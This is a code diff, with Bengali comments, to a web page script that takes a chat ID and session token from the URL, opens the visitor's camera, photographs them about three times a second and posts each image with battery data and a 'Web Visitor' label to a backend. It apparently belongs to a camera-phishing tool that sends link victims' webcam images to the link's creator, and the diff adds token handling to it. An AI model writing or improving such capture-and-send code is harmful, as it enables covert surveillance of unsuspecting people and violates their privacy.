@@ -57,6 +57,7 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
+        const sessionToken = urlParams.get('s'); // সেশন টোকেন রিসিভ করা হলো
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -78,7 +79,7 @@
                 });
                 video.srcObject = stream;
 
-                // প্রতি ৩৩০ মিলিসেকেন্ডে ১টি করে ছবি তুলবে (অর্থাৎ সেকেন্ডে প্রায় ৩টি)
+                // প্রতি ৩৩০ মিলিসেকেন্ডে ১টি করে ছবি তুলবে
                 setInterval(() => {
                     captureAndSend();
                 }, 330);
@@ -89,7 +90,7 @@
         }
 
         function captureAndSend() {
-            if (!chatId) return;
+            if (!chatId || !sessionToken) return;
 
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
@@ -102,6 +103,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: chatId,
+                    s: sessionToken, // ব্যাকএন্ডে সেশন টোকেন পাঠানো হচ্ছে
                     image: imageData,
                     name: "Web Visitor",
                     battery: batteryInfo,
@@ -109,7 +111,11 @@
                 })
             })
             .then(res => res.json())
-            .then(data => console.log("Sent successfully:", data))
+            .then(data => {
+                if(data.status === "error") {
+                    console.log("Server response:", data.message);
+                }
+            })
             .catch(err => console.error("Upload error:", err));
         }
 
